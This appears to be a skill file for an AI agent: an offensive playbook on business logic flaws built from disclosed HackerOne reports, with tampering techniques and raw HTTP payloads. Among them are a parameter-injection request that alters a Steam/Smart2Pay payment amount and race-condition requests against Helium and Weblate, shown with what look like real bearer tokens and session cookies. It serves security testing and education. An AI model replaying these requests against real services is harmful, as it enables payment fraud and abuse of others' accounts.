---
name: business-logic
description: "Business Logic Flaws offensive playbook from 223 disclosed HackerOne reports (12 critical, 43 high, 89 medium, 79 low). Use when hunting or reviewing business logic flaws. Triggers: allowed, attacker, email, discovered, file."
license: "For authorized security testing and education only."
---

# Business Logic Flaws

> Distilled from **223** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

The app enforces the wrong rules for its workflow  -  price/quantity tampering, skipped steps, replay, negative values, state-machine abuse  -  even when each request is individually 'valid'.

## Where to hunt

- Model the intended workflow and money/quantity flows; try to do steps out of order, skip payment, or reuse artifacts.

## Exploitation playbook

- Negative or fractional quantities/amounts; client-set prices; reuse of a paid receipt; coupon stacking.
- Skip verification steps or replay a completed step to gain benefit.

## Bypass techniques

- Client-side-only checks trusted by the server; assumed-immutable fields that are actually editable.

## Impact & escalation

- Financial fraud, free/entitlement abuse, integrity loss.

## Remediation

- Enforce invariants and pricing server-side, validate state transitions, make critical fields immutable, re-verify each step.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1295844](https://hackerone.com/reports/1295844)  -  Modify in-flight data to payment provider Smart2Pay
*critical, $7,500*

```http
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
Referer: https://store.steampowered.com/

MerchantID=1102&MerchantTransactionID=███&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40███████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=███
```

### 2. [#1295844](https://hackerone.com/reports/1295844)  -  Modify in-flight data to payment provider Smart2Pay
*critical, $7,500*

```http
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
Referer: https://store.steampowered.com/

MerchantID=1102&MerchantTransactionID=██████&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40██████████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=█████████
```

### 3. [#3399218](https://hackerone.com/reports/3399218)  -  Improper sanitisation of input in the settings could cause DoS
*low*

```http
POST /test2/revive-adserver-6.0.1/www/admin/account-settings-email.php HTTP/1.1
Host: localhost
Content-Length: 1122
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAFTySI5FcKHdgQSw
Referer: http://localhost/test2/revive-adserver-6.0.1/www/admin/account-settings-email.php
Cookie: sessionID=44958de8497392e940916ecd332da541; ox_install_session_id=ln1aq7d4aopg1511andp5oocji

------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="submitok"

true
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="email_fromAddress"

1@aa.com
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="email_fromName"

1@aa.com
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="email_fromCompany"

1@aa.com
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="submitok"
# … truncated …
```

### 4. [#974892](https://hackerone.com/reports/974892)  -  Race Condition of Transfer data Credits to Organization Leads to Ad…
*medium, $250*

```http
POST /api/data_credits/transfer_dc HTTP/1.1
Host: console.helium.com
Content-Length: 66
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndsbXNzZUJDY01oSjdpQ3RjZ2wyeiJ9.eyJuaWNrbmFtZSI6ImVpc3NlbjVjKzIiLCJuYW1lIjoiZWlzc2VuNWMrMkB3ZWFyZWhhY2tlcm9uZS5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvM2E1YTY3MjhlODkyN2YxYTgxYmJiZWQzY2I0MGI2OWI_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZlaS5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wOS0wNFQxNzo1NDowNy4xMjFaIiwiZW1haWwiOiJlaXNzZW41YysyQHdlYXJlaGFja2Vyb25lLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL2F1dGguaGVsaXVtLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZjUyN2YwYTMzYzBhMjAwNmQ1OTJjNDkiLCJhdWQiOiJiSGx0N043MEhPVHFZSkJ2R2NvbjFsQVJGcDc4WFczMyIsImlhdCI6MTU5OTI0MjI0NCwiZXhwIjoxNTk5Mjc4MjQ0LCJub25jZSI6InJhQ25sSE1kM1o4cERManNORUt0Rk80R2ZBZlRkUDdfUkIyWXRGNTB4MlcifQ.LdiVe8woYQ9nKky6s9x0AdcH75gf0lrSqO9wWhTW6aD38VDesRgZQZcopvKWwltdv0g6cfd0qSc0NOXSTJU-YCxnM_SmTwQdzz_w7t3tdj4H4NPMgxvk7Wi0Q0Ot5gnBFy-Hs43kNq_6JgON2fdOd3ANxTPyKo10sp_z_9I6XoPydUKl0vWOqCAAtqWY09yKnsAcUOiKAvwlToyRPpyzb0CiB2CkITgXRpq5I5dkx0MSikgfOtbMgHwXIwyR4221VaU9quZ21gHCj5h_b-eS5ZDK8c5lqrjheNHv0hSSquDOUJ-PJuZIXmdzthC4nDNUXFr56h5yBxdwvz14mF-xIQ
Content-Type: application/json
Origin: https://console.helium.com
# … truncated …
```

### 5. [#1295844](https://hackerone.com/reports/1295844)  -  Modify in-flight data to payment provider Smart2Pay
*critical, $7,500*

```http
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
```

### 6. [#1087188](https://hackerone.com/reports/1087188)  -  Race Condition allows to get more free trials and get more than 100…
*low*

```http
POST /trial/ HTTP/1.1
Host: hosted.weblate.org
Referer: https://hosted.weblate.org/
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: https://hosted.weblate.org
Cookie: __cfduid=d584084fe0b125b922a38b58143580cde1610884176; django_language=en; sessionid=csxoox0r…

csrfmiddlewaretoken=D74cp8jYYfF2xMBJ3TtawMKpI7T6OU27yuUYwra8QWOmMaryGdqTjWTzU1a15Q2z
```

More payloads: see [payloads.md](payloads.md) (122 curated).

## Recurring patterns in this dataset

Most frequent terms across the 223 reports (term (count)): `allowed` (77), `attacker` (51), `email` (33), `discovered` (30), `file` (30), `access` (26), `potentially` (26), `curl` (26), `free` (25), `limit` (25), `rate` (24), `found` (22), `verification` (22), `race` (21), `condition` (21), `version` (21), `information` (20), `data` (19)

## Worked example  -  [report #894569](https://hackerone.com/reports/894569)

*An attacker can run pipeline jobs as arbitrary user* (critical, $12,000)

> Summary An attacker can run arbitrary pipeline jobs as a victim user. This means the attacker can access the user private repositories, member only repositories, registry, etc... by using the victim CI JOB TOKEN token. This is only my recent research and I wanted to report it as soon as possible. I will update the report with more information later on. Steps to reproduce VICTIM: - Sign in to a GitLab instance as a Victim user - Create an arbitrary private repository with some private files. (We will steal this repo as a poc.) ATTACKER ACCOUNT 1: - Sign in to a GitLab instance as a Attacker1 user - Create a new project using the following settings: - Project Name: poc - Visibility Level : pu…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#894569](https://hackerone.com/reports/894569) | critical | $12,000 | gitlab | An attacker can run pipeline jobs as arbitrary user |
| [#307239](https://hackerone.com/reports/307239) | critical | $10,000 | coinbase | Double Payout via PayPal |
| [#1295844](https://hackerone.com/reports/1295844) | critical | $7,500 | valve | Modify in-flight data to payment provider Smart2Pay |
| [#2588329](https://hackerone.com/reports/2588329) | critical | $2,000 | indrive | Change phone number OTP flaw leads to any phone number takeover |
| [#938021](https://hackerone.com/reports/938021) | critical | $2,000 | eternal | Availing Zomato gold by using a random third-party `wallet_id` |
| [#300748](https://hackerone.com/reports/300748) | critical |  -  | coinbase | Ethereum account balance manipulation |
| [#328526](https://hackerone.com/reports/328526) | critical |  -  | coinbase | ETH contract handling errors |
| [#364843](https://hackerone.com/reports/364843) | critical |  -  | upserve | OLO Total price manipulation using negative quantities |

*See [reference.md](reference.md) for all 223 reports in this class.*
